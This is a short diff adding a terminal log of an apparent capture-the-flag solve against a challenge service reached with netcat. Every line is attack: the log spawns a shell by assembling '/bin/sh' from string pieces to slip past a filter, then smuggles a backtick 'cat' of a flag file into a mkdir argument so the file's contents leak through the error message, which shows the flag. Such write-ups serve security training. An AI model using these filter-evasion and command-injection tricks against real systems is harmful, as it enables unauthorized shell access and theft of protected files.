@@ -1,0 +1,4 @@
+> nc service.challenges.pwnerrank.com 5004
+< $ a=/bin/s;a+=h;`$a`
+> mkdir `cat /home/script4/flag.txt`
+< mkdir: cannot create directory ‘pwnerrank{rolling_in_the_box}’: Permission denied
